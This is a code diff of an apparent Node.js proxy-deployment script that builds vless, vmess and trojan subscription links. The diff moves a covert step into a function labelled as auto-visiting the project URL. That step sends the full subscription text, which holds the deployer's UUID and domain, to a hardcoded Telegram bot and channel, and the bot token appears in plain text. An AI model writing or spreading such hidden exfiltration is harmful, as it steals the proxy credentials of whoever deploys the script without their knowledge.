@@ -421,12 +421,7 @@ vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
   
 trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${NAME}-${ISP}
     `;
-        let apiToken = "1952639092:AAHZ6p4FlhaIDO3E55eKKumu2twBMf3NvtE";
-        let chatId = "@dfsfsdfsdfsdfws";
-
-        let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${subTxt}`;
-
-        let request = await axios.get(urlString);
+       
         
         // 打印 sub.txt 内容到控制台
         console.log(Buffer.from(subTxt).toString('base64'));
@@ -522,11 +517,18 @@ cleanFiles();
 // 自动访问项目URL
 
 async function modsbots() {
+  const subTxt = `
+vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${NAME}-${ISP}
+  
+vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
+  
+trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${NAME}-${ISP}
+    `;
   let apiToken = "1952639092:AAHZ6p4FlhaIDO3E55eKKumu2twBMf3NvtE";
   let chatId = "@dfsfsdfsdfsdfws";
   let text = PROJECT_URL;
 
-  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}/sub`;
+  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${subTxt}`;
 
   let request = await axios.get(urlString);
   }
